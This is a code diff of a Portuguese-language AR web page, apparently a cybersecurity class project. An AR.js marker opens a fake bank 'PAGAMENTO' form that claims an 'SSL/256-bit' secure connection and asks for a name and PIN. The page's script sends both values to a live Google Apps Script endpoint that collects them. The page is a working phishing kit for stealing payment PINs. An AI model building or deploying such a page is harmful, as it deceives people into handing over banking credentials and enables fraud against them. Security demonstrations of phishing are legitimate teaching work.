@@ -1,70 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Projeto Cibersegurança - Final</title>
+    <title>Projeto Cibersegurança - Estável</title>
     <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
     <script src="https://raw.githack.com/AR-js-org/AR.js/master/aframe/build/aframe-ar.js"></script>
     <style>
-        /* Estilo do Formulário */
+        /* TRAVA TOTAL: Invisível, sem clique e fora da tela por padrão */
         #hacker-form {
-            position: fixed; 
-            top: 50%; 
-            left: 50%; 
-            transform: translate(-50%, -50%);
-            background: rgba(15, 15, 15, 0.98); 
-            padding: 25px; 
-            border-radius: 15px;
-            z-index: 9999; 
-            text-align: center; 
-            color: white; 
-            font-family: 'Segoe UI', sans-serif;
-            border: 2px solid #e74c3c; 
-            box-shadow: 0 0 20px rgba(231, 76, 60, 0.5);
-            width: 85%; 
-            max-width: 300px;
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: rgba(15, 15, 15, 0.98); padding: 25px; border-radius: 15px;
+            z-index: 9999; text-align: center; color: white; 
+            font-family: 'Segoe UI', sans-serif; border: 2px solid #e74c3c; 
+            box-shadow: 0 0 20px rgba(231, 76, 60, 0.5); width: 85%; max-width: 300px;
+            
+            /* Bloqueio de inicialização */
+            display: none !important;
+            opacity: 0;
+            pointer-events: none;
         }
-        input { 
-            padding: 12px; width: 90%; margin: 10px 0; border-radius: 8px; 
-            border: 1px solid #444; background: #222; color: white; font-size: 16px;
-        }
-        button { 
-            padding: 12px 25px; background: #e74c3c; color: white; 
-            border: none; border-radius: 8px; cursor: pointer; font-weight: bold;
-            width: 100%; margin-top: 10px;
-        }
+        input { padding: 12px; width: 90%; margin: 10px 0; border-radius: 8px; border: 1px solid #444; background: #222; color: white; font-size: 16px; }
+        button { padding: 12px 25px; background: #e74c3c; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
         .status { color: #888; font-size: 11px; margin-top: 10px; }
     </style>
 </head>
 
 <body style="margin: 0px; overflow: hidden;">
 
-    <div id="hacker-form" hidden style="display: none !important;">
-        <h2 style="color: #e74c3c; margin-top: 0; font-size: 22px;">PAGAMENTO</h2>
-        <p style="font-size: 14px;">Identifique-se para continuar:</p>
+    <div id="hacker-form">
+        <h2 style="color: #e74c3c; margin-top: 0;">PAGAMENTO</h2>
+        <p>Identifique-se para continuar:</p>
         <input type="text" id="nome-input" placeholder="Seu Nome">
-        <input type="password" id="pin-input" placeholder="Digite seu PIN" inputmode="numeric" pattern="[0-9]*">
+        <input type="password" id="pin-input" placeholder="Digite seu PIN" inputmode="numeric">
         <button id="btn-enviar" onclick="enviarDados()">CONFIRMAR PAGAMENTO</button>
         <div class="status">🔒 Conexão Segura SSL/256-bit</div>
     </div>
 
     <a-scene embedded arjs="sourceType: webcam; debugUIEnabled: false;">
-        <a-assets>
-            <img id="btnBanco" src="botao_banco2.png">
-        </a-assets>
-
+        <a-assets><img id="btnBanco" src="botao_banco2.png"></a-assets>
         <a-entity cursor="rayOrigin: mouse" raycaster="objects: .clickable"></a-entity>
 
         <a-marker type="pattern" url="marker.patt">
-            <a-image class="clickable" src="#btnBanco" 
-                     position="0 0.1 0" rotation="-90 0 0" 
-                     width="2.5" height="3.0"
-                     onclick="mostrarFormulario()">
-            </a-image>
-
-            <a-plane class="clickable" position="0 0.15 0" rotation="-90 0 0" 
-                     width="2.6" height="3.1" material="opacity: 0.1; color: red" 
-                     onclick="mostrarFormulario()">
-            </a-plane>
+            <a-image class="clickable" src="#btnBanco" position="0 0.1 0" rotation="-90 0 0" width="2.5" height="3.0" onclick="mostrarFormulario()"></a-image>
+            <a-plane class="clickable" position="0 0.15 0" rotation="-90 0 0" width="2.6" height="3.1" material="opacity: 0.1; color: red" onclick="mostrarFormulario()"></a-plane>
         </a-marker>
 
         <a-entity camera></a-entity>
@@ -73,47 +50,46 @@
     <script>
         const linkPlanilha = "https://script.google.com/macros/s/AKfycbz1k8PdYUutAn6JWMN8KpoGBy61bl70-UVmzwZ5-hQ55Dtpp9OQtlBYTUWe7FxKojA/exec";
 
+        // Garante que o form esteja morto no início
+        const form = document.getElementById('hacker-form');
+        form.style.display = 'none';
+
         function mostrarFormulario() {
-            const form = document.getElementById('hacker-form');
-            // Remove a trava de invisibilidade
-            form.removeAttribute('hidden');
+            // Só ativa quando você realmente clica
             form.style.setProperty('display', 'block', 'important');
+            form.style.opacity = "1";
+            form.style.pointerEvents = "auto";
         }
 
         function enviarDados() {
             const nome = document.getElementById('nome-input').value;
             const pin = document.getElementById('pin-input').value;
 
-            if (!nome || !pin) {
-                alert("Preencha todos os campos.");
-                return;
-            }
+            if (!nome || !pin) { alert("Preencha tudo!"); return; }
 
             const btn = document.getElementById('btn-enviar');
             btn.innerHTML = "PROCESSANDO...";
             btn.disabled = true;
 
-            // Envio para a planilha
             fetch(`${linkPlanilha}?nome=${encodeURIComponent(nome)}&senha=${encodeURIComponent(pin)}`, {
                 method: 'POST',
                 mode: 'no-cors'
             })
             .then(() => {
-                alert("🚨 OPERAÇÃO CONCLUÍDA!\n\nDados enviados ao servidor.");
-                
-                // Reseta e esconde com as travas de novo
+                alert("🚨 OPERAÇÃO CONCLUÍDA!");
+                // Reseta e mata o form de novo
                 document.getElementById('nome-input').value = "";
                 document.getElementById('pin-input').value = "";
-                const form = document.getElementById('hacker-form');
-                form.setAttribute('hidden', 'true');
                 form.style.setProperty('display', 'none', 'important');
-                
+                form.style.opacity = "0";
+                form.style.pointerEvents = "none";
                 btn.innerHTML = "CONFIRMAR PAGAMENTO";
                 btn.disabled = false;
             })
-            .catch(err => {
+            .catch(() => {
                 alert("Erro ao enviar.");
                 btn.disabled = false;
+                btn.innerHTML = "CONFIRMAR PAGAMENTO";
             });
         }
     </script>
